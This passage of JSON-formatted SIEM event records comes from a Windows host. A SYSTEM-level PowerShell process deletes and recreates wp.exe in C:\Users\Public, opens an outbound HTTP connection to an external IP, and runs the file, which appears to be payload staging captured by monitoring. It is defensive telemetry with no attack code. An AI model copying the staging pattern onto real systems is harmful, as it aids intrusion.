      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T14:00:12.3049953Z\"},\"EventRecordID\":\"248388\",\"Correlation\":{\"ActivityID\":\"{085a976f-3d95-0002-a751-6408953ddb01}\"},\"Execution\":{\"ProcessID\":\"7564\",\"ThreadID\":\"9488\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\"rm wp.exe\"},{\"Name\":\"ScriptBlockId\",\"text\":\"2d9e6f50-0078-4d9e-93de-5b8ac806ed12\"},{\"Name\":\"Path\"}]}}}",
      "category.generic": "Command",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Operating system",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-PowerShell",
      "event_src.subsys": "microsoft-windows-powershell/operational",
      "event_src.title": "windows",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "4104",
      "normalized": true,
      "numfield1": 1,
      "numfield2": 1,
      "object": "command",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.id": "2d9e6f50-0078-4d9e-93de-5b8ac806ed12",
      "object.process.cmdline": "rm wp.exe",
      "object.process.id": "7564",
      "object.value": "rm wp.exe",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "account",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T14:00:12.3040000Z",
      "uuid": "175e8bba-ad91-11ef-b052-005056b7517e",
      "text": "A PowerShell command is executed on host wperry.dev.it.stf. Creating Scriptblock text (1 of 1).",
      "_checkpoint": 216157536433,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "175e8bba-ad91-11ef-b052-005056b7517e",
        "time": "2024-11-28T14:00:12.3040000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "create",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"11\",\"Version\":\"2\",\"Level\":\"4\",\"Task\":\"11\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T14:00:13.8931801Z\"},\"EventRecordID\":\"2437607\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"-\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 14:00:13.889\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"TargetFilename\",\"text\":\"C:\\\\Users\\\\Public\\\\wp.exe\"},{\"Name\":\"CreationUtcTime\",\"text\":\"2024-11-28 13:59:01.586\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "File System Object",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "datafield18": "powershell.exe (7564) [999] \u2190 powershell.exe (7280) [999] \u2190 ccmexec.exe (4660) [999]",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_11_File_create",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "11",
      "normalized": true,
      "object": "file_object",
      "object.fullpath": "c:\\users\\public\\wp.exe",
      "object.name": "wp.exe",
      "object.path": "c:\\users\\public\\",
      "object.property": "creation time",
      "object.value": "2024-11-28T13:59:01.5860000Z",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.chain": "powershell.exe \u2190 powershell.exe \u2190 ccmexec.exe",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "subject.process.id": "7564",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T14:00:13.8930000Z",
      "uuid": "24aee6e5-ad91-11ef-b052-005056b7517e",
      "text": "The process powershell.exe created the file wp.exe on host wperry.dev.it.stf",
      "_checkpoint": 216158146031,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "24aee6e5-ad91-11ef-b052-005056b7517e",
        "time": "2024-11-28T14:00:13.8930000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "detect",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"3\",\"Version\":\"5\",\"Level\":\"4\",\"Task\":\"3\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T14:00:15.8737216Z\"},\"EventRecordID\":\"2437609\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"4980\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"-\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:59:59.670\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"},{\"Name\":\"Protocol\",\"text\":\"tcp\"},{\"Name\":\"Initiated\",\"text\":\"true\"},{\"Name\":\"SourceIsIpv6\",\"text\":\"false\"},{\"Name\":\"SourceIp\",\"text\":\"10.156.92.66\"},{\"Name\":\"SourceHostname\",\"text\":\"wperry.dev.it.stf\"},{\"Name\":\"SourcePort\",\"text\":\"61866\"},{\"Name\":\"SourcePortName\",\"text\":\"-\"},{\"Name\":\"DestinationIsIpv6\",\"text\":\"false\"},{\"Name\":\"DestinationIp\",\"text\":\"3.5.140.10\"},{\"Name\":\"DestinationHostname\",\"text\":\"-\"},{\"Name\":\"DestinationPort\",\"text\":\"80\"},{\"Name\":\"DestinationPortName\",\"text\":\"http\"}]}}}",
      "category.generic": "Connection",
      "category.high": "Network Interaction Management",
      "category.low": "State",
      "direction": "egress",
      "dst.host": "3.5.140.10",
      "dst.ip": "3.5.140.10",
      "dst.port": 80,
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.ip": "10.156.92.66",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_3_Network_connection",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "3",
      "normalized": true,
      "object": "connection",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "object.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "object.process.id": "7564",
      "object.process.name": "powershell.exe",
      "object.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "protocol": "tcp",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "src.fqdn": "wperry.dev.it.stf",
      "src.host": "wperry.dev.it.stf",
      "src.hostname": "wperry",
      "src.ip": "10.156.92.66",
      "src.port": 61866,
      "status": "success",
      "subject": "rule",
      "subject.name": "-",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T14:00:15.8730000Z",
      "uuid": "24aee6e7-ad91-11ef-b052-005056b7517e",
      "text": "A tcp connection from host wperry.dev.it.stf to host 3.5.140.10 is opened on host wperry.dev.it.stf",
      "_checkpoint": 216158146033,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "24aee6e7-ad91-11ef-b052-005056b7517e",
        "time": "2024-11-28T14:00:15.8730000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "execute",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T14:00:57.8386769Z\"},\"EventRecordID\":\"248394\",\"Correlation\":{\"ActivityID\":\"{085a976f-3d95-0000-9078-6308953ddb01}\"},\"Execution\":{\"ProcessID\":\"7564\",\"ThreadID\":\"9488\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\".\\\\wp\"},{\"Name\":\"ScriptBlockId\",\"text\":\"c15d6a99-ddca-47e4-a840-5b1b66f26ce8\"},{\"Name\":\"Path\"}]}}}",
      "category.generic": "Command",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Operating system",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-PowerShell",
      "event_src.subsys": "microsoft-windows-powershell/operational",
      "event_src.title": "windows",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "4104",
      "normalized": true,
      "numfield1": 1,
      "numfield2": 1,
      "object": "command",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.id": "c15d6a99-ddca-47e4-a840-5b1b66f26ce8",
      "object.process.cmdline": ".\\wp",
      "object.process.id": "7564",
      "object.value": ".\\wp",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "account",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T14:00:57.8380000Z",
      "uuid": "4144680e-ad91-11ef-b052-005056b7517e",
      "text": "A PowerShell command is executed on host wperry.dev.it.stf. Creating Scriptblock text (1 of 1).",
      "_checkpoint": 216159760169,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "4144680e-ad91-11ef-b052-005056b7517e",
        "time": "2024-11-28T14:00:57.8380000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
